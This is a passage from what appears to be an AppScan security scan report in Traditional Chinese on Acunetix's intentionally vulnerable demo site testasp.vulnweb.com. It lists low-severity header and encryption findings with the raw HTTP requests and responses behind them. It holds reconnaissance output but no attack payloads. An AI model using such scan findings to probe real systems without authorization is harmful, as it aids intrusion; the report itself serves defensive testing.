Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:51 GMT
Content-Length: 926
<span class="highlight">Set-Cookie: ASPSESSIONIDQQQQQDST=PDAFDCMBJIOPBBEIHNBDBOOG; path=/</span>

vti_encoding:SR|utf8-nl
vti_timelastmodified:TR|05 Oct 2007 10:01:19 -0000
vti_extenderversion:SR|4.0.2.8912
vti_cacheddtm:TX|05 Oct 2007 10:01:19 -0000
vti_filesize:IR|3663
vti_cachedlinkinfo:VX|Q|styles.css H|http://www.acunetix.com/ S|Images/logo.gif H|Templatize.asp H|Default.asp H|Search.asp
vti_cachedsvcrellinks:VX|FQUS|acuforum/styles.css NHHS|http://www.acunetix.com/ FSUS|acuforum/Images/logo.gif FHUS|acuforum/Templatize.asp FHUS|acuforum/Default.asp FHUS|acuforum/Search.asp
vti_cachedtitle:SR|acuforum forums
vti_title:SR|acuforum forums
vti_cachedbodystyle:SR|&lt;body&gt;
vti_cachedhasbots:BR|false
vti_cachedhastheme:BR|false
vti_cachedhasborder:BR|false
vti_metatags:VR|HTTP-EQUIV=Content-Type text/html;\\ charset=iso-8859-1
vti_backlinkinfo:VX|acuforum/login.asp acuforum/register.asp acuforum/search.asp acuforum/default.asp acuforum/showthread.asp acuforum/showforum.asp acuforum/templatize.asp
</div></div><div id="attUnnecessaryResponseHeaders" class="issueType" xmlns=""><div class="severity severity_1">低</div><div><h2 class="nowordwrap"><a href="#attUnnecessaryResponseHeaders">應用程式中找到不必要的 HTTP 回應標頭</a>
					 
					<span class="count">1</span><a name="attUnnecessaryResponseHeaders"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attUnnecessaryResponseHeaders">應用程式中找到不必要的 HTTP 回應標頭</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">testasp.vulnweb.com (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集 Web 應用程式相關的機密性資訊，如：使用者名稱、密碼、機器名稱及/或機密檔案位置</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>不安全的 Web 應用程式設計或配置</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attUnnecessaryResponseHeaders_Adv">請勿容許機密性資訊洩漏。</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">回應包含不必要的標頭，這可能協助攻擊者規劃進一步的攻擊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:29:44 GMT
Content-Length: 3561
Set-Cookie: ASPSESSIONIDSQRQRDTS=CHIDJHPAECPDJMDBPHCPGHPP; path=/


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div id="attNoHttpsRedirection" class="issueType" xmlns=""><div class="severity severity_1">低</div><div><h2 class="nowordwrap"><a href="#attNoHttpsRedirection">缺少加密</a>
					 
					<span class="count">1</span><a name="attNoHttpsRedirection"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attNoHttpsRedirection">缺少加密</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">testasp.vulnweb.com (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能竊取以未加密方式傳送的機密資料，如：信用卡號碼、社會保險號碼等等</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>機密性輸入欄位（如：使用者名稱、密碼和信用卡號碼）傳遞時未加密</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attNoHttpsRedirection_Adv">設定 TLS/SSL 以確保將通訊加密。</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">測試回應具有不安全的 Http 架構。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:29:48 GMT
Content-Length: 3561
Set-Cookie: ASPSESSIONIDSQRQRDTS=FHIDJHPAEBBALGFGMKJOAGNP; path=/


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div id="attContentSecurityPolicy" class="issueType" xmlns=""><div class="severity severity_1">低</div><div><h2 class="nowordwrap"><a href="#attContentSecurityPolicy">遺漏「Content-Security-Policy」標頭</a>
					 
					<span class="count">1</span><a name="attContentSecurityPolicy"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attContentSecurityPolicy">遺漏「Content-Security-Policy」標頭</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">testasp.vulnweb.com (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集 Web 應用程式相關的機密性資訊，如：使用者名稱、密碼、機器名稱及/或機密檔案位置</li><li>有可能說服無經驗而易受騙的使用者提供機密性資訊，如：使用者名稱、密碼、信用卡號碼、社會保險號碼等等</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>不安全的 Web 應用程式設計或配置</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attContentSecurityPolicy_Adv">配置伺服器利用安全原則使用 "Content-Security-Policy" 標頭</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">AppScan 偵測到遺漏 Content-Security-Policy 回應標頭或包含不安全的原則，這會增加各種跨網站注入攻擊的暴露風險</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 <span class="highlight">200</span> OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:38:20 GMT
Content-Length: 3561
Set-Cookie: ASPSESSIONIDQQQQQDST=KHIADCMBGLCPGKABDEKOINEO; path=/


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div id="ContentTypeOptions" class="issueType" xmlns=""><div class="severity severity_1">低</div><div><h2 class="nowordwrap"><a href="#ContentTypeOptions">遺漏或不安全的 "X-Content-Type-Options" 標頭</a>
					 
					<span class="count">1</span><a name="ContentTypeOptions"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#ContentTypeOptions">遺漏或不安全的 "X-Content-Type-Options" 標頭</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">testasp.vulnweb.com (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集 Web 應用程式相關的機密性資訊，如：使用者名稱、密碼、機器名稱及/或機密檔案位置</li><li>有可能說服無經驗而易受騙的使用者提供機密性資訊，如：使用者名稱、密碼、信用卡號碼、社會保險號碼等等</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>不安全的 Web 應用程式設計或配置</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#ContentTypeOptions_Adv">配置伺服器利用 "nosniff" 值使用 "X-Content-Type-Options" 標頭</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">AppScan 偵測到遺漏 X-Content-Type-Options 回應標頭或具有不安全的值，這會增加路過式下載攻擊的暴露風險</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 <span class="highlight">200</span> OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:29:49 GMT
Content-Length: 3561
Set-Cookie: ASPSESSIONIDSQRQRDTS=LHIDJHPABALFDNOEJKCEFLFH; path=/


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
